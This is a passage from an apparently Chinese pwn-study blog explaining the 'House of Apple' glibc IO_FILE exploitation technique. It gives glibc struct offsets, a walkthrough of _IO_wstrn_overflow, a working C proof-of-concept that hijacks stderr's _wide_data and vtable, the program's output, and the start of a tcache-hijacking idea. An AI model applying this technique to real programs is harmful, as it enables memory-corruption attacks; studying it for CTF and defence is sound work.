class="line"><span class="number">37</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"><span class="number">38</span> </span><br><span class="line"><span class="number">39</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">40</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="house-of-apple"><a href="#house-of-apple" class="headerlink" title="house of apple"></a>house of apple</h2><p>原文<a href="https://bbs.kanxue.com/thread-273418.htm#%E6%80%BB%E7%BB%93">原创 House of apple 一种新的glibc中IO攻击方法 (1)-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>程序从 <code>main</code> 函数返回或者可以调用 <code>exit</code> 函数</li><li>能够泄露出heapbase和libc地址</li><li>能够使用一次 largebin_attack</li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当程序从main函数返回或者执行exit的时候调用链如下</p><blockquote><p>exit -&gt; fcloseall -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</p></blockquote><p>和之前的FSOP一样，最后会调用_IO_OVERFLOW</p><p>使用 <code>largebin_attack</code> 可以劫持 <code>_IO_list_all</code> 变量，替换为伪造的 <code>IO_FILE</code> 结构体，我们仍然可以利用某些 IO 流函数去修改其他地方的值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_complete</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> _file;</span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> *_codecvt;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span> *_wide_data; <span class="comment">// 劫持这个变量</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> *_freeres_list;</span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="built_in">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="built_in">sizeof</span> (<span class="type">void</span> *) - <span class="built_in">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">amd64：</span><br><span class="line"></span><br><span class="line"><span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x10</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line"><span class="number">0x18</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line"><span class="number">0x28</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line"><span class="number">0x38</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line"><span class="number">0x40</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line"><span class="number">0x48</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line"><span class="number">0x50</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line"><span class="number">0x58</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line"><span class="number">0x60</span>:<span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line"><span class="number">0x68</span>:<span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line"><span class="number">0x70</span>:<span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line"><span class="number">0x74</span>:<span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line"><span class="number">0x78</span>:<span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x80</span>:<span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line"><span class="number">0x82</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x83</span>:<span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line"><span class="number">0x88</span>:<span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line"><span class="number">0x90</span>:<span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x98</span>:<span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line"><span class="number">0xa0</span>:<span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line"><span class="number">0xa8</span>:<span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line"><span class="number">0xb0</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line"><span class="number">0xb8</span>:<span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line"><span class="number">0xc0</span>:<span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line"><span class="number">0xc4</span>:<span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line"><span class="number">0xd8</span>:<span class="string">&#x27;vtable&#x27;</span></span><br></pre></td></tr></table></figure><p>随后我们伪造 <code>_IO_FILE</code> 结构体，这时候我们要利用到一个函数 <code>_IO_wstrn_overflow</code> </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* When we come to here this means the user supplied buffer is</span></span><br><span class="line"><span class="comment">     filled.  But since we must return the number of characters which</span></span><br><span class="line"><span class="comment">     would have been written in total we must provide a buffer for</span></span><br><span class="line"><span class="comment">     further use.  We can do this by writing on and on in the overflow</span></span><br><span class="line"><span class="comment">     buffer in the _IO_wstrnfile structure.  */</span></span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">         snf-&gt;overflow_buf + (<span class="built_in">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                      / <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">                      + (<span class="built_in">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                     / <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Since we are not really interested in storing the characters</span></span><br><span class="line"><span class="comment">     which do not fit in the buffer we simply ignore it.  */</span></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析一下这个函数，首先将<code>fp</code>强转为<code>_IO_wstrnfile *</code>指针，然后判断<code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code>是否成立（一般肯定是成立的），如果成立则会对<code>fp-&gt;_wide_data</code>的<code>_IO_write_base</code>、<code>_IO_read_base</code>、<code>_IO_read_ptr</code>和<code>_IO_read_end</code>赋值为<code>snf-&gt;overflow_buf</code>或者与该地址一定范围内偏移的值；最后对<code>fp-&gt;_wide_data</code>的<code>_IO_write_ptr</code>和<code>_IO_write_end</code>赋值。</p><p>也就是说，只要控制了<code>fp-&gt;_wide_data</code>，就可以控制从<code>fp-&gt;_wide_data</code>开始一定范围内的内存的值，也就等同于<strong>任意地址写已知地址</strong>。</p><p><code>_IO_wstrn_file</code> 涉及到的结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *vtable;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_strfile_</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span> _sbf;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span> _s;</span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">char</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_strnfile;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>]; <span class="comment">// overflow_buf在这里********</span></span><br><span class="line">&#125; _IO_wstrnfile</span><br></pre></td></tr></table></figure><p>其中 <code>overflow_buf</code> 相对于 <code>_IO_FILE</code> 的偏移为 <strong>0xf0</strong></p><p><code>struct  _IO_wide_data</code> 如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stdin, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stderr, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate a 0x100 chunk&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="type">size_t</span> *tmp = p1;</span><br><span class="line">    <span class="type">size_t</span> old_value = <span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p1[i] = old_value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;puts;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *)puts_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_write_ptr_addr = puts_addr + <span class="number">0x1997b8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_write_ptr_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_flags2_addr = puts_addr + <span class="number">0x199804</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_flags2_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_wide_data_addr = puts_addr + <span class="number">0x199830</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_wide_data_addr);</span><br><span class="line">    <span class="type">size_t</span> sdterr_vtable_addr = puts_addr + <span class="number">0x199868</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;vtable address: %p\n&quot;</span>, (<span class="type">void</span> *)sdterr_vtable_addr);</span><br><span class="line">    <span class="type">size_t</span> _IO_wstrn_jumps_addr = puts_addr + <span class="number">0x194ed0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_write_ptr_addr = (<span class="type">size_t</span>)<span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_flags2_addr = <span class="number">8</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_wide_data_addr = (<span class="type">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)sdterr_vtable_addr = (<span class="type">size_t</span>)_IO_wstrn_jumps_addr;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: call fcloseall and trigger house of apple&quot;</span>);</span><br><span class="line">    <span class="built_in">fcloseall</span>();</span><br><span class="line">    tmp = p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即做了如下修改：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stderr+<span class="number">0x28</span> = <span class="number">-1</span>（stderr-&gt;_IO_write_ptr）</span><br><span class="line">stderr+<span class="number">0x74</span> = <span class="number">8</span>（stderr-&gt;_flags2）</span><br><span class="line">stderr+<span class="number">0xa0</span> = target（stderr-&gt;_wide_data）</span><br><span class="line">stderr+<span class="number">0xd8</span> == _IO_wstrn_jumps（stderr-&gt;vtable）</span><br></pre></td></tr></table></figure><p>输出结果为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">roderick@ee8b10ad26b9:~/hack$ gcc demo.c -o demo -g -w &amp;&amp; ./demo</span><br><span class="line">[*] allocate a 0x100 chunk</span><br><span class="line">===========================old value=======================</span><br><span class="line">[0x55cfb956d2a0]: 0x1122334455667788  0x1122334455667788</span><br><span class="line">[0x55cfb956d2b0]: 0x1122334455667788  0x1122334455667788</span><br><span class="line">[0x55cfb956d2c0]: 0x1122334455667788  0x1122334455667788</span><br><span class="line">[0x55cfb956d2d0]: 0x1122334455667788  0x1122334455667788</span><br><span class="line">===========================old value=======================</span><br><span class="line">[*] puts address: 0x7f648b8a6ef0</span><br><span class="line">[*] stderr-&gt;_IO_write_ptr address: 0x7f648ba406a8</span><br><span class="line">[*] stderr-&gt;_flags2 address: 0x7f648ba406f4</span><br><span class="line">[*] stderr-&gt;_wide_data address: 0x7f648ba40720</span><br><span class="line">[*] stderr-&gt;vtable address: 0x7f648ba40758</span><br><span class="line">[*] _IO_wstrn_jumps address: 0x7f648ba3bdc0</span><br><span class="line">[+] step 1: change stderr-&gt;_IO_write_ptr to -1</span><br><span class="line">[+] step 2: change stderr-&gt;_flags2 to 8</span><br><span class="line">[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk</span><br><span class="line">[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps</span><br><span class="line">[+] step 5: call fcloseall and trigger house of apple</span><br><span class="line">===========================new value=======================</span><br><span class="line">[0x55cfb956d2a0]: 0x00007f648ba40770  0x00007f648ba40870</span><br><span class="line">[0x55cfb956d2b0]: 0x00007f648ba40770  0x00007f648ba40770</span><br><span class="line">[0x55cfb956d2c0]: 0x00007f648ba40770  0x00007f648ba40770</span><br><span class="line">[0x55cfb956d2d0]: 0x00007f648ba40770  0x00007f648ba40870</span><br><span class="line">===========================new value=======================</span><br></pre></td></tr></table></figure><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="思路一：修改tcache线程变量"><a href="#思路一：修改tcache线程变量" class="headerlink" title="思路一：修改tcache线程变量"></a>思路一：修改tcache线程变量</h3><p>这里需要利用 <code>house of pig</code> ，利用 <code>_IO_str_overflow</code> 中的 <code>malloc</code> 进行的任意地址分配并且利用 <code>memcpy</code> 进行覆盖</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base; <span class="comment">// 赋值为old_buf</span></span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 这里任意地址分配</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 劫持_IO_buf_base后即可任意地址写任意值</span></span><br><span class="line">          <span class="built_in">free</span> (old_buf);</span><br><span class="line">      <span class="comment">// .......</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li>伪造至少两个<code>_IO_FILE</code>结构体</li><li>第一个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_wstrn_overflow</code>函数修改<code>tcache</code>全局变量为已知值，也就控制了<code>tcache 